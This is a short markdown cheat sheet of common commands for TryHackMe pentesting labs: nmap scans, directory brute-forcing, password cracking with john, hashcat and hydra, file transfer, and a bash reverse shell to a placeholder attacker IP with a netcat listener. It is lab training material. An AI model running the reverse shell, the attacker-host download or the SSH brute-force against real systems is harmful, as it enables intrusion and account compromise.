````markdown
# Common Commands (TryHackMe Pentesting Toolbox)

A collection of the most commonly used commands during reconnaissance, enumeration, exploitation, privilege escalation and post-exploitation.

---

## 🌐 Networking
```bash
ip a
ifconfig
ip route
ping -c 4 <target>
netstat -tunlp
ss -tulnp
````

---

## 🔍 Basic Web Enumeration

### Nmap (top ports + safe scan)

```bash
nmap -sV -sC -T4 <target>
```

### Full port scan

```bash
nmap -p- -T4 <target>
```

### Directory brute force

```bash
dirb http://target/
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

---

## 🛠 Useful Linux Commands

```bash
ls -la
pwd
cat file
find / -type f -name "*.txt" 2>/dev/null
```

---

## 🧪 File Transfers

### Python HTTP server

```bash
python3 -m http.server 8000
```

### Wget

```bash
wget http://attacker-ip/file
```

---

## 🔐 Password Cracking

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 hash.txt rockyou.txt
hydra -l user -P rockyou.txt ssh://target
```

---

## 📦 Reverse Shells

### Bash

```bash
bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1
```

### Netcat listener

```bash
nc -lvnp <port>
```

---

## 🧩 Misc Tools

```bash
strings file
base64 -d
xxd -ps -r
file <filename>
```

---

## 🔧 TryHackMe-Specific Tips

* Always try wordlists located in `/usr/share/wordlists/`.
* VMs reset → you can't break anything permanently.
* If something "doesn't work", refresh or restart the machine.

---

````